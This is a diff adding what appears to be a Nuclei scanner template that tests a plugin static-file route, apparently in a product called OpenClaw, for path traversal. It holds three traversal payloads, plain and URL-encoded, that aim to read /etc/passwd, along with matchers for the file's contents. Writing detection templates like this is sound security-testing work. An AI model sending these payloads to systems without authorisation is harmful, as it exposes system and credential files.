@@ -1,0 +1,27 @@
+id: openclaw-plugin-path-traversal
+
+info:
+  name: OpenClaw Plugin Path Traversal
+  author: lobster-guard
+  severity: high
+  description: Tests for path traversal via plugin static file serving
+  tags: openclaw,plugin,traversal,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/__openclaw__/plugins/../../../etc/passwd"
+      - "{{BaseURL}}/__openclaw__/plugins/..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/__openclaw__/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
